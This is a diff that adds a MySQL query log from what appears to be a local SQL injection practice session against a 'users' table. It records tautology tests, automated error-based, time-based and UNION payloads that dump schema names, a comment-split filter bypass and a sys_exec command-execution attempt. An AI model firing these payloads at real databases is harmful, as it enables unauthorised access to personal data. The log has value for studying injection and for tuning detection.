@@ -1,0 +1,419 @@
+                   84 Query    select @@version_comment limit 1
+241203 12:02:32     84 Query    CREATE USER 'kira'@'localhost' IDENTIFIED BY 'kira'
+                    84 Query    GRANT ALL PRIVILEGES ON *.* TO 'kira'@'localhost' WITH GRANT OPTION
+                    84 Query    FLUSH PRIVILEGES
+241203 12:02:39     84 Quit
+241203 12:02:52     85 Connect  newuser@localhost on  using Socket
+                    85 Connect  Access denied for user 'newuser'@'localhost' (using password: YES)
+241203 12:02:58     86 Connect  kira@localhost on  using Socket
+                    86 Query    select @@version_comment limit 1
+241203 12:03:02     32 Quit
+241203 12:04:30     86 Quit
+241203 12:04:41     87 Connect  kira@localhost on user_db using TCP/IP
+241203 12:04:52     88 Connect  kira@localhost on  using Socket
+                    88 Query    select @@version_comment limit 1
+241203 12:04:56     88 Query    show databases
+241203 12:05:03     88 Quit
+241203 12:05:30     89 Connect  kira@localhost on ali using TCP/IP
+                    89 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                    89 Query    set autocommit=0
+                    89 Query    SELECT * FROM users WHERE user_id = None
+241203 12:05:31     90 Connect  kira@localhost on ali using TCP/IP
+                    90 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                    90 Query    set autocommit=0
+                    90 Query    SELECT * FROM users WHERE user_id = None
+241203 12:05:36     91 Connect  kira@localhost on ali using TCP/IP
+                    91 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                    91 Query    set autocommit=0
+                    91 Query    SELECT * FROM users WHERE user_id = 1
+                    91 Quit
+241203 12:05:48     92 Connect  kira@localhost on ali using TCP/IP
+                    92 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                    92 Query    set autocommit=0
+                    92 Query    SELECT * FROM users WHERE user_id = 1
+                    92 Quit
+241203 12:06:42     93 Connect  kira@localhost on  using Socket
+                    93 Connect  Access denied for user 'kira'@'localhost' (using password: NO)
+241203 12:06:44     94 Connect  kira@localhost on  using Socket
+                    94 Query    select @@version_comment limit 1
+241203 12:06:48     94 Query    user ali
+241203 12:06:51     94 Query    SELECT DATABASE()
+                    94 Init DB  ali
+                    94 Query    show databases
+                    94 Query    show tables
+                    94 Field List       users 
+241203 12:07:32     94 Query    INSERT INTO users (first_name, last_name, email, password, date_of_birth)
+       VALUES ('kira', 'kira', 'kira@example.com', 'kira', '1990-01-01')
+241203 12:07:35     95 Connect  kira@localhost on ali using TCP/IP
+                    95 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                    95 Query    set autocommit=0
+                    95 Query    SELECT * FROM users WHERE user_id = 1
+                    95 Quit
+241203 12:07:37     96 Connect  kira@localhost on ali using TCP/IP
+                    96 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                    96 Query    set autocommit=0
+                    96 Query    SELECT * FROM users WHERE user_id = 2
+                    96 Quit
+241203 12:07:41     97 Connect  kira@localhost on ali using TCP/IP
+                    97 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                    97 Query    set autocommit=0
+                    97 Query    SELECT * FROM users WHERE user_id = 1 or 1=1
+241203 12:07:44     98 Connect  kira@localhost on ali using TCP/IP
+                    98 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                    98 Query    set autocommit=0
+                    98 Query    SELECT * FROM users WHERE user_id = 1 or 1=1 --
+241203 12:07:48     99 Connect  kira@localhost on ali using TCP/IP
+                    99 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                    99 Query    set autocommit=0
+                    99 Query    SELECT * FROM users WHERE user_id = 1
+                    99 Quit
+241203 12:08:24    100 Connect  kira@localhost on ali using TCP/IP
+                   100 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   100 Query    set autocommit=0
+                   100 Query    SELECT * FROM users WHERE user_id = 1 OR 1=1
+241203 12:08:28    101 Connect  kira@localhost on ali using TCP/IP
+                   101 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   101 Query    set autocommit=0
+                   101 Query    SELECT * FROM users WHERE user_id = 1 OR 1=1 -- -
+241203 12:08:34    102 Connect  kira@localhost on ali using TCP/IP
+                   102 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   102 Query    set autocommit=0
+                   102 Query    SELECT * FROM users WHERE user_id = 1 OR true -- -
+241203 12:08:38    103 Connect  kira@localhost on ali using TCP/IP
+                   103 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   103 Query    set autocommit=0
+                   103 Query    SELECT * FROM users WHERE user_id = 1 OR
+241203 12:08:40    104 Connect  kira@localhost on ali using TCP/IP
+                   104 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   104 Query    set autocommit=0
+                   104 Query    SELECT * FROM users WHERE user_id = 1
+                   104 Quit
+241203 12:08:42    105 Connect  kira@localhost on ali using TCP/IP
+                   105 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   105 Query    set autocommit=0
+                   105 Query    SELECT * FROM users WHERE user_id = 2
+                   105 Quit
+241203 12:10:50    106 Connect  kira@localhost on ali using TCP/IP
+                   106 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   106 Query    set autocommit=0
+                   106 Query    SELECT * FROM users WHERE user_id = 2 or 1=1
+241203 12:10:59    107 Connect  kira@localhost on ali using TCP/IP
+                   107 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   107 Query    set autocommit=0
+                   107 Query    SELECT * FROM users WHERE user_id = 2 or
+241203 12:11:07    108 Connect  kira@localhost on ali using TCP/IP
+                   108 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   108 Query    set autocommit=0
+                   108 Query    SELECT * FROM users WHERE user_id = 1 OR 1=1
+241203 12:11:11    109 Connect  kira@localhost on ali using TCP/IP
+                   109 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   109 Query    set autocommit=0
+                   109 Query    SELECT * FROM users WHERE user_id = 1
+                   109 Quit
+241203 12:11:33    110 Connect  kira@localhost on ali using TCP/IP
+                   110 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   110 Query    set autocommit=0
+                   110 Query    SELECT * FROM users WHERE user_id = 1
+                   110 Quit
+                   111 Connect  kira@localhost on ali using TCP/IP
+                   111 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   111 Query    set autocommit=0
+                   111 Query    SELECT * FROM users WHERE user_id = 1
+                   111 Quit
+                   112 Connect  kira@localhost on ali using TCP/IP
+                   112 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   112 Query    set autocommit=0
+                   112 Query    SELECT * FROM users WHERE user_id = 1
+                   112 Quit
+                   113 Connect  kira@localhost on ali using TCP/IP
+                   113 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   113 Query    set autocommit=0
+                   113 Query    SELECT * FROM users WHERE user_id = 9697
+                   113 Quit
+241203 12:11:34    114 Connect  kira@localhost on ali using TCP/IP
+                   114 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   114 Query    set autocommit=0
+                   114 Query    SELECT * FROM users WHERE user_id = 1"...)',,(.
+                   115 Connect  kira@localhost on ali using TCP/IP
+                   115 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   115 Query    set autocommit=0
+                   115 Query    SELECT * FROM users WHERE user_id = 1'ZoruyQ<'">vNHUjz
+                   116 Connect  kira@localhost on ali using TCP/IP
+                   116 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   116 Query    set autocommit=0
+                   116 Query    SELECT * FROM users WHERE user_id = 1) AND 6711=3246 AND (5950=5950
+                   117 Connect  kira@localhost on ali using TCP/IP
+                   117 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   117 Query    set autocommit=0
+                   117 Query    SELECT * FROM users WHERE user_id = 1) AND 1014=1014 AND (1248=1248
+                   118 Connect  kira@localhost on ali using TCP/IP
+                   118 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   118 Query    set autocommit=0
+                   118 Query    SELECT * FROM users WHERE user_id = 1 AND 1127=1676
+                   118 Quit
+                   119 Connect  kira@localhost on ali using TCP/IP
+                   119 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   119 Query    set autocommit=0
+                   119 Query    SELECT * FROM users WHERE user_id = 1 AND 1014=1014
+                   119 Quit
+                   120 Connect  kira@localhost on ali using TCP/IP
+                   120 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   120 Query    set autocommit=0
+                   120 Query    SELECT * FROM users WHERE user_id = 1 AND 7886=8965
+                   120 Quit
+                   121 Connect  kira@localhost on ali using TCP/IP
+                   121 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   121 Query    set autocommit=0
+                   121 Query    SELECT * FROM users WHERE user_id = (SELECT CONCAT(CONCAT(0x7171787671,(CASE WHEN (2175=2175) THEN 0x31 ELSE 0x30 END)),0x7171767071))
+                   121 Quit
+                   122 Connect  kira@localhost on ali using TCP/IP
+                   122 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   122 Query    set autocommit=0
+                   122 Query    SELECT * FROM users WHERE user_id = 1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171787671,(SELECT (ELT(4531=4531,1))),0x7171767071,0x78))s), 8446744073709551610, 8446744073709551610)))
+                   123 Connect  kira@localhost on ali using TCP/IP
+                   123 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   123 Query    set autocommit=0
+                   123 Query    SELECT * FROM users WHERE user_id = 1 OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7171787671,(SELECT (ELT(8249=8249,1))),0x7171767071,0x78))s), 8446744073709551610, 8446744073709551610)))
+                   124 Connect  kira@localhost on ali using TCP/IP
+                   124 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   124 Query    set autocommit=0
+                   124 Query    SELECT * FROM users WHERE user_id = 1 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171787671,(SELECT (ELT(3588=3588,1))),0x7171767071,0x78))x))
+                   125 Connect  kira@localhost on ali using TCP/IP
+                   125 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   125 Query    set autocommit=0
+                   125 Query    SELECT * FROM users WHERE user_id = 1 OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171787671,(SELECT (ELT(2509=2509,1))),0x7171767071,0x78))x))
+                   126 Connect  kira@localhost on ali using TCP/IP
+                   126 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   126 Query    set autocommit=0
+                   126 Query    SELECT * FROM users WHERE user_id = 1 AND GTID_SUBSET(CONCAT(0x7171787671,(SELECT (ELT(5275=5275,1))),0x7171767071),5275)
+                   127 Connect  kira@localhost on ali using TCP/IP
+                   127 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   127 Query    set autocommit=0
+                   127 Query    SELECT * FROM users WHERE user_id = 1 OR GTID_SUBSET(CONCAT(0x7171787671,(SELECT (ELT(4695=4695,1))),0x7171767071),4695)
+                   128 Connect  kira@localhost on ali using TCP/IP
+                   128 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   128 Query    set autocommit=0
+                   128 Query    SELECT * FROM users WHERE user_id = 1 AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171787671,(SELECT (ELT(8212=8212,1))),0x7171767071)) USING utf8)))
+                   128 Quit
+                   129 Connect  kira@localhost on ali using TCP/IP
+                   129 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   129 Query    set autocommit=0
+                   129 Query    SELECT * FROM users WHERE user_id = 1 OR JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7171787671,(SELECT (ELT(1197=1197,1))),0x7171767071)) USING utf8)))
+                   129 Quit
+                   130 Connect  kira@localhost on ali using TCP/IP
+                   130 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   130 Query    set autocommit=0
+                   130 Query    SELECT * FROM users WHERE user_id = 1 AND (SELECT 9395 FROM(SELECT COUNT(*),CONCAT(0x7171787671,(SELECT (ELT(9395=9395,1))),0x7171767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+                   131 Connect  kira@localhost on ali using TCP/IP
+                   131 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   131 Query    set autocommit=0
+                   131 Query    SELECT * FROM users WHERE user_id = (SELECT CONCAT(0x7171787671,(ELT(6893=6893,1)),0x7171767071))
+                   131 Quit
+                   132 Connect  kira@localhost on ali using TCP/IP
+                   132 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   132 Query    set autocommit=0
+                   132 Query    SELECT * FROM users WHERE user_id = 1
+                   132 Quit
+                   133 Connect  kira@localhost on ali using TCP/IP
+                   133 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   133 Query    set autocommit=0
+                   133 Query    SELECT * FROM users WHERE user_id = 1
+                   133 Quit
+                   134 Connect  kira@localhost on ali using TCP/IP
+                   134 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   134 Query    set autocommit=0
+                   134 Query    SELECT * FROM users WHERE user_id = 1
+                   134 Quit
+                   135 Connect  kira@localhost on ali using TCP/IP
+                   135 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   135 Query    set autocommit=0
+                   135 Query    SELECT * FROM users WHERE user_id = 1
+                   135 Quit
+                   136 Connect  kira@localhost on ali using TCP/IP
+                   136 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   136 Query    set autocommit=0
+                   136 Query    SELECT * FROM users WHERE user_id = 1
+                   136 Quit
+                   137 Connect  kira@localhost on ali using TCP/IP
+                   137 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   137 Query    set autocommit=0
+                   137 Query    SELECT * FROM users WHERE user_id = 1
+                   137 Quit
+                   138 Connect  kira@localhost on ali using TCP/IP
+                   138 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   138 Query    set autocommit=0
+                   138 Query    SELECT * FROM users WHERE user_id = 1
+                   138 Quit
+                   139 Connect  kira@localhost on ali using TCP/IP
+                   139 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   139 Query    set autocommit=0
+                   139 Query    SELECT * FROM users WHERE user_id = 1
+                   139 Quit
+                   140 Connect  kira@localhost on ali using TCP/IP
+                   140 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   140 Query    set autocommit=0
+                   140 Query    SELECT * FROM users WHERE user_id = 1
+                   140 Quit
+                   141 Connect  kira@localhost on ali using TCP/IP
+                   141 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   141 Query    set autocommit=0
+                   141 Query    SELECT * FROM users WHERE user_id = 1
+                   141 Quit
+                   142 Connect  kira@localhost on ali using TCP/IP
+                   142 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   142 Query    set autocommit=0
+                   142 Query    SELECT * FROM users WHERE user_id = 1
+                   142 Quit
+                   143 Connect  kira@localhost on ali using TCP/IP
+                   143 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   143 Query    set autocommit=0
+                   143 Query    SELECT * FROM users WHERE user_id = 1;SELECT SLEEP(5)#
+                   144 Connect  kira@localhost on ali using TCP/IP
+                   144 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   144 Query    set autocommit=0
+                   144 Query    SELECT * FROM users WHERE user_id = 1;SELECT SLEEP(5)
+                   145 Connect  kira@localhost on ali using TCP/IP
+                   145 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   145 Query    set autocommit=0
+                   145 Query    SELECT * FROM users WHERE user_id = 1;(SELECT * FROM (SELECT(SLEEP(5)))OeZG)#
+                   146 Connect  kira@localhost on ali using TCP/IP
+                   146 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   146 Query    set autocommit=0
+                   146 Query    SELECT * FROM users WHERE user_id = 1;(SELECT * FROM (SELECT(SLEEP(5)))QCGk)
+                   147 Connect  kira@localhost on ali using TCP/IP
+                   147 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   147 Query    set autocommit=0
+                   147 Query    SELECT * FROM users WHERE user_id = 1;SELECT BENCHMARK(5000000,MD5(0x4c6c4957))#
+                   148 Connect  kira@localhost on ali using TCP/IP
+                   148 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   148 Query    set autocommit=0
+                   148 Query    SELECT * FROM users WHERE user_id = 1;SELECT BENCHMARK(5000000,MD5(0x446b6c4b))
+                   149 Connect  kira@localhost on ali using TCP/IP
+                   149 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   149 Query    set autocommit=0
+                   149 Query    SELECT * FROM users WHERE user_id = 1 AND (SELECT 4314 FROM (SELECT(SLEEP(5)))FAHu)
+241203 12:11:39    149 Quit
+                   150 Connect  kira@localhost on ali using TCP/IP
+                   150 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   150 Query    set autocommit=0
+                   150 Query    SELECT * FROM users WHERE user_id = 1 AND (SELECT 4314 FROM (SELECT(SLEEP(0)))FAHu)
+                   150 Quit
+                   151 Connect  kira@localhost on ali using TCP/IP
+                   151 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   151 Query    set autocommit=0
+                   151 Query    SELECT * FROM users WHERE user_id = 1 AND (SELECT 4314 FROM (SELECT(SLEEP(5)))FAHu)
+241203 12:11:44    151 Quit
+                   152 Connect  kira@localhost on ali using TCP/IP
+                   152 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   152 Query    set autocommit=0
+                   152 Query    SELECT * FROM users WHERE user_id = 1 ORDER BY 1-- -
+                   152 Quit
+                   153 Connect  kira@localhost on ali using TCP/IP
+                   153 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   153 Query    set autocommit=0
+                   153 Query    SELECT * FROM users WHERE user_id = 1 ORDER BY 2811-- -
+                   154 Connect  kira@localhost on ali using TCP/IP
+                   154 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   154 Query    set autocommit=0
+                   154 Query    SELECT * FROM users WHERE user_id = 1 ORDER BY 10-- -
+                   155 Connect  kira@localhost on ali using TCP/IP
+                   155 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   155 Query    set autocommit=0
+                   155 Query    SELECT * FROM users WHERE user_id = 1 ORDER BY 6-- -
+                   155 Quit
+                   156 Connect  kira@localhost on ali using TCP/IP
+                   156 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   156 Query    set autocommit=0
+                   156 Query    SELECT * FROM users WHERE user_id = 1 ORDER BY 8-- -
+                   157 Connect  kira@localhost on ali using TCP/IP
+                   157 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   157 Query    set autocommit=0
+                   157 Query    SELECT * FROM users WHERE user_id = 1 ORDER BY 7-- -
+                   157 Quit
+                   158 Connect  kira@localhost on ali using TCP/IP
+                   158 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   158 Query    set autocommit=0
+                   158 Query    SELECT * FROM users WHERE user_id = 1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171787671,0x4d676853527a537a6c635372476679747469414e6152554169586f6f555574434b4b5a4c6868497a,0x7171767071),NULL,NULL-- -
+                   159 Connect  kira@localhost on ali using TCP/IP
+                   159 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   159 Query    set autocommit=0
+                   159 Query    SELECT * FROM users WHERE user_id = 1 UNION ALL SELECT CONCAT(0x7171787671,0x5843554154735a666e78667061536f4863474b6a574e51596e6d495175614b6d714e725668586551,0x7171767071),NULL,NULL,NULL,NULL,NULL,NULL-- -
+                   160 Connect  kira@localhost on ali using TCP/IP
+                   160 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   160 Query    set autocommit=0
+                   160 Query    SELECT * FROM users WHERE user_id = 1 UNION ALL SELECT NULL,NULL,CONCAT(0x7171787671,0x79784e57556342596955757a5468794c54586373694c4e6766504e50576654757053737667714e75,0x7171767071),NULL,NULL,NULL,NULL-- -
+                   161 Connect  kira@localhost on ali using TCP/IP
+                   161 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   161 Query    set autocommit=0
+                   161 Query    SELECT * FROM users WHERE user_id = 1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7171787671,0x4854636a6d6a52476b75525944576a75416376654c555965504f48694848696f6747454167716d49,0x7171767071),NULL,NULL,NULL-- -
+                   162 Connect  kira@localhost on ali using TCP/IP
+                   162 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   162 Query    set autocommit=0
+                   162 Query    SELECT * FROM users WHERE user_id = 1 UNION ALL SELECT NULL,CONCAT(0x7171787671,0x6b535279777a4b7054456c7a487156734956534c7752676263417374444952566e557167737a6d63,0x7171767071),NULL,NULL,NULL,NULL,NULL-- -
+                   163 Connect  kira@localhost on ali using TCP/IP
+                   163 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   163 Query    set autocommit=0
+                   163 Query    SELECT * FROM users WHERE user_id = 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171787671,0x52717a7861546a4b77444c4343416c747056667657676273484c4944736c6567436e67556b71716f,0x7171767071),NULL-- -
+                   164 Connect  kira@localhost on ali using TCP/IP
+                   164 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   164 Query    set autocommit=0
+                   164 Query    SELECT * FROM users WHERE user_id = 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171787671,0x67547454744246664658536a734e6c45637375746a667a6579665a7372536556545a61465763494a,0x7171767071)-- -
+                   165 Connect  kira@localhost on ali using TCP/IP
+                   165 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   165 Query    set autocommit=0
+                   165 Query    SELECT * FROM users WHERE user_id = 1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171787671,0x704162487364504a4867,0x7171767071),NULL,NULL-- -
+                   166 Connect  kira@localhost on ali using TCP/IP
+                   166 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   166 Query    set autocommit=0
+                   166 Query    SELECT * FROM users WHERE user_id = 1 UNION ALL SELECT CONCAT(0x7171787671,0x6f5645704b616a726549,0x7171767071),NULL,NULL,NULL,NULL,NULL,NULL-- -
+                   167 Connect  kira@localhost on ali using TCP/IP
+                   167 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   167 Query    set autocommit=0
+                   167 Query    SELECT * FROM users WHERE user_id = 1 UNION ALL SELECT NULL,NULL,CONCAT(0x7171787671,0x43726b72486c4e435a44,0x7171767071),NULL,NULL,NULL,NULL-- -
+                   168 Connect  kira@localhost on ali using TCP/IP
+                   168 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   168 Query    set autocommit=0
+                   168 Query    SELECT * FROM users WHERE user_id = 1 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7171787671,0x52765149775a484f6f75,0x7171767071),NULL,NULL,NULL-- -
+                   169 Connect  kira@localhost on ali using TCP/IP
+                   169 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   169 Query    set autocommit=0
+                   169 Query    SELECT * FROM users WHERE user_id = 1 UNION ALL SELECT NULL,CONCAT(0x7171787671,0x5957656f724571615854,0x7171767071),NULL,NULL,NULL,NULL,NULL-- -
+                   170 Connect  kira@localhost on ali using TCP/IP
+                   170 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   170 Query    set autocommit=0
+                   170 Query    SELECT * FROM users WHERE user_id = 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171787671,0x7368656c765877464259,0x7171767071),NULL-- -
+                   171 Connect  kira@localhost on ali using TCP/IP
+                   171 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   171 Query    set autocommit=0
+                   171 Query    SELECT * FROM users WHERE user_id = 1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7171787671,0x43457577664776556b6b,0x7171767071)-- -
+                   172 Connect  kira@localhost on ali using TCP/IP
+                   172 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   172 Query    set autocommit=0
+                   172 Query    SELECT * FROM users WHERE user_id = -5608 UNION ALL SELECT NULL,CONCAT(0x7171787671,0x54746b6171717644426a485153655079535045674f594a744f7a7a516745444a704e4a4c556a5470,0x7171767071),NULL,NULL,NULL,NULL,NULL-- -
+                   172 Quit
+                   173 Connect  kira@localhost on ali using TCP/IP
+                   173 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   173 Query    set autocommit=0
+                   173 Query    SELECT * FROM users WHERE user_id = -2944 UNION ALL SELECT NULL,CONCAT(0x7171787671,(CASE WHEN (4641=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                4641) THEN 1 ELSE 0 END),0x7171767071),NULL,NULL,NULL,NULL,NULL-- -
+                   173 Quit
+                   174 Connect  kira@localhost on ali using TCP/IP
+                   174 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   174 Query    set autocommit=0
+                   174 Query    SELECT * FROM users WHERE user_id = -5491 UNION ALL SELECT NULL,CONCAT(0x7171787671,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x7171767071),NULL,NULL,NULL,NULL,NULL-- -
+                   174 Quit
+241203 12:11:58    175 Connect  kira@localhost on ali using TCP/IP
+                   175 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   175 Query    set autocommit=0
+                   175 Query    SELECT * FROM users WHERE user_id = 1
+                   175 Quit
+                   176 Connect  kira@localhost on ali using TCP/IP
+                   176 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   176 Query    set autocommit=0
+                   176 Query    SELECT * FROM users WHERE user_id = -2243 UNION ALL SELECT NULL,CONCAT(0x7171787671,JSON_ARRAYAGG(CONCAT_WS(0x627971696b74,schema_name)),0x7171767071),NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA-- -
+                   176 Quit
+241203 12:24:48    177 Connect  kira@localhost on ali using TCP/IP
+                   177 Query    SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
+                   177 Query    set autocommit=0
+                   177 Query    SELECT * FROM users WHERE user_id = 1 un/**/ion se/**/lect 1,2,3--
+                   177 Query    SELECT * FROM users WHERE user_id = CHAR(66,100,109,105,110)
+                   177 Query    SELECT *,sys_exec("ls") FROM users WHERE user_id =name=0x4865727020446572706572
